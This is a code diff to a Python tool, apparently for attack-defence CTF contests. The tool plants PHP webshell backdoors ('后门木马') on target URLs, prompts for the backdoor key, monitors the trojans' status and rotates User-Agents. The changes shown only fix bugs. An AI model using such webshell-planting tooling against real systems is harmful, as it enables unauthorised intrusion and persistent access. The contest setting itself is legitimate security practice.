@@ -31,7 +31,7 @@ ua = [
 ]
 rand_num = random.randint(1, len(ua))
 header = {}
-header["User-Agent:"] = ua[rand_num]
+header["User-Agent"] = ua[rand_num-1]
 
 help = """
     ----------------------------------后门木马选择----------------------------------------------------
@@ -106,7 +106,7 @@ class fuck_Awd():
                 phpfile_Key = str(input("\033[1;32m输入植入后门木马的key:\033[0m"))
                 upload_PHPma(url_target, self.url_method, url_PHPpath, php_maKey, ma_method, url_PHPfile,  verb_execution_code=None, upload_judgement=upload_judgement, execution_code=None, sel_ma=None, phpfile_Name=phpfile_Name, phpfile_Key=phpfile_Key, ma_func=self.ma_func)
         except:
-            echo.print_yellow("\nERROR: EXIT!")
+            echo.print_yellow("\nERROR EXIT!")
 
     def troJan_Status_Mon(self):
         try:
@@ -220,7 +220,8 @@ class fuck_Awd():
                                      execution_code=execution_code, sel_ma=sel_ma, phpfile_Name=phpfile_Name,
                                      phpfile_Key=phpfile_Key, ma_func=self.ma_func)
             else:
-                print("111")
+                echo.print_yellow("参数错误!")
+                return
         elif upload_judgement.lower() == 'n':
             try:
                 ip_lst = []
